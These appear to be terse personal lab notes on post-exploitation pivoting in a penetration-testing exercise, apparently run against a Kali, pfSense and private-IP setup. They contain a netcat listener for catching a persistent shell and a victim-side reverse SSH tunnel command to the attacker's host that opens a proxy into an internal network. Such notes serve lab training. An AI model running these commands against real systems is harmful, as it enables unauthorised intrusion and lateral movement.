catch persistent shell	
(ATK) nc -lvp 55556

*upgrade shell [2:26]
Pivot post exploitation

(ATK)(TERM 1) netstat -natp (SHOULD SEE YOUR PORT AND ESTABLISHED)

(ATK)(TERM 1) netstat -natp | grep LISTEN (OUT OUTPUT SHOULD BE 9080 QUAD 0* LISTEN)

after catching app 1 (MY PORT 55556) SSH
open ssh for a listner to set up proxy

(ATK)(TERM 1) sudo systemctl status ssh.service > CTL + C (CHECK/CHANGE/CHECK)

(VIC 1) ssh -N -f -R 127.0.0.1:9080 kali@192.168.122.209 -p 55555 (MAKE SURE PORT FWD RULE IS GOOD ON PFSENSE SSH PORT 22)
this how you get your proxy open???

(VIC 1) should be promted a pass


(ATK)(TERM 2) LS > CD INTERNAL (SHOULD SEE IP'S PING SWEEPS AND TARGETS) > LS > CD 192.168.1.102
